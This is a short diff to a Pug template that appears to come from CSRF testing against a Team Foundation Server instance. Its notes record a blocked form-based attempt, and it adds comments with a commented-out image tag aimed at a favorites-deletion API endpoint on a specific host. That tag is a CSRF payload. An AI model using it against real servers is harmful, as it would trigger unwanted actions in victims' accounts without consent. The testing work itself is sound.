@@ -29,3 +29,8 @@ block content
     // PREFLIGHT FAILS. AS ONLY PARTICULAR ORIGINS ARE ALLLOWED. UNABLE TO REACH CONTENT-TYPE.
     form.break-csrf-by-form
     // Why was the content type a vulnerability? As we won't even reach the content type step.
+
+
+// CSRF with deletion of Favorited project
+// https://{tfsURL}/_apis/Favorite/Favorites/f3fbeb06-814e-4197-8adb-092b489ecde4?artifactType=Microsoft.TeamFoundation.Classification.TeamProject&artifactScopeType=Project&artifactScopeId={ProjectId}
+// img.csrf-image(src='https://verify.me.tfsallin.net:444/_apis/Favorite/Favorites2/9e769d7f-92fa-44ed-9289-60f05b0d7a45?artifactType=Microsoft.TeamFoundation.Classification.TeamProject&artifactScopeType=Project&artifactScopeId=0aaa2941-36e0-45e1-bc15-625c9f21c4ef', width=600)
